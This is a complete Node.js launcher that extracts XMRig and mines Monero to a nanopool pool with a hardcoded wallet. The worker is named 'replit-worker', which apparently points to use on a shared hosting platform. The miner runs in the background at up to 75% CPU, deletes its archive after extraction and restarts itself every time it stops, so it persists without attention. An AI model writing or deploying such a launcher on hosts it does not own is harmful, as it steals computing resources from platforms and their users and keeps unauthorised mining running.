const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');
const { createWriteStream } = require('fs');
const { pipeline } = require('stream');
const tar = require('tar');

const minerFolder = 'xmrig-6.21.0';
const minerBinary = './xmrig';
const minerTar = 'xmrig-6.21.0-linux-x64.tar.gz';

async function checkXmrig() {
  // Check if XMRig binary exists
  if (fs.existsSync(minerBinary)) {
    console.log('[*] XMRig already present. Skipping download and extraction.');
    return;
  }

  console.log('[*] XMRig not found. Checking for tar.gz file...');

  // Check if tar.gz file exists
  if (fs.existsSync(minerTar)) {
    console.log('[*] tar.gz file found. Extracting XMRig...');
    await extractXmrig();
    return;
  }

  console.log('[*] XMRig tar.gz file not found. Please ensure the tar file is in the main directory.');
  process.exit(1);
}

async function extractXmrig() {
  try {
    await tar.x({ file: minerTar });
    fs.renameSync(path.join(minerFolder, 'xmrig'), minerBinary);
    fs.chmodSync(minerBinary, 0o755);
    cleanUp();
    console.log('[*] XMRig extracted and ready.');
  } catch (err) {
    console.error('[!] Failed to extract the archive:', err.message);
    process.exit(1);
  }
}

function cleanUp() {
  try {
    fs.rmSync(minerTar);
    fs.rmSync(minerFolder, { recursive: true, force: true });
  } catch (err) {
    console.error('[!] Failed to clean up temporary files:', err.message);
  }
}

async function startMining() {
  console.log('[*] Starting XMRig...');

  const pool = 'xmr-eu1.nanopool.org:14444';
  const wallet = '48ahQdgq3V2Vtoh6We2sM1YH6BSQxH4m9T4G38AJkubkYZBxye2B9kWgCHTEYiq5Wyb52xjTYY4CAie75T41iCr91gGZ9UP';
  const workerName = 'replit-worker';
  const email = 'your@email.com';

  const xmrig = spawn(minerBinary, [
    '-o', pool,
    '-u', `${wallet}.${workerName}/${email}`,
    '-p', 'x',
    '--coin', 'monero',
    '--donate-level', '1',
    '--cpu-priority', '5',
    '--max-cpu-usage', '75',
    '--background', // Run xmrig in background
  ], { stdio: ['ignore', 'pipe', 'pipe'] });

  xmrig.stdout.on('data', (data) => {
    process.stdout.write(`xmrig: ${data}`);
  });

  xmrig.stderr.on('data', (data) => {
    process.stderr.write(`xmrig error: ${data}`);
  });

  xmrig.on('close', (code) => {
    console.error(`[!] XMRig exited with code ${code}. Restarting in 5 seconds...`);
    setTimeout(startMining, 5000);
  });
}

(async () => {
  try {
    await checkXmrig();
    await startMining();
  } catch (err) {
    console.error('[!] Fatal Error:', err.message);
    process.exit(1);
  }
})();
